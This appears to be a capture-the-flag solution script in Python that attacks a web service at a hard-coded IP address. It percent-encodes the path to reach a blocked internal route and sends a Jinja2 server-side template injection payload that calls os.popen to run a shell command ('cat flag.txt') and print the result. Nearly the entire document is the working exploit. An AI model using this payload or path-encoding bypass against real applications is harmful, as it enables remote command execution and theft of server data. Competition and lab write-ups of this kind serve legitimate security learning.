import requests

URL = "http://34.76.206.46:10014"

cmd = "cat flag.txt"

payload = "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('%s').read() }}" %cmd

req = requests.Request("GET", "http://foo")
prep = req.prepare()
prep.url = f"{URL}/interna%6c?username={payload}"
res = requests.Session().send(prep)

print(res.text)

